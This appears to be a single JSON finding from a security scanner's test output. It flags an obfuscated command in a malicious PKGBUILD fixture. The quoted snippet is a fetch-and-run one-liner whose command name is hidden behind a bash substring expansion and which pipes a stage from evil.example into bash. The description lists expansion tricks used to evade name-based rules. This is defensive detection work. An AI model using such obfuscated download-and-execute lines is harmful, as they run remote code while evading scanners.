    {
      "id": "OBF-020",
      "severity": "high",
      "category": "obfuscation",
      "title": "Dynamic command name",
      "description": "The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), \"$1\") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or \"${CMAKE[@]}\" are not matched.",
      "location": {
        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
        "line": 13,
        "column": 1,
        "snippet": "    ${c:1:4} -fsSL https://evil.example/stage1 | bash"
      },
      "recommendation": "Review the line; the command being run is assembled at run time to avoid matching.",
      "cwe_id": "CWE-94",
      "metadata": {
        "matched_text": "    ${c:1:4} -fsSL https://evil.example/stage1 | bash"
      }
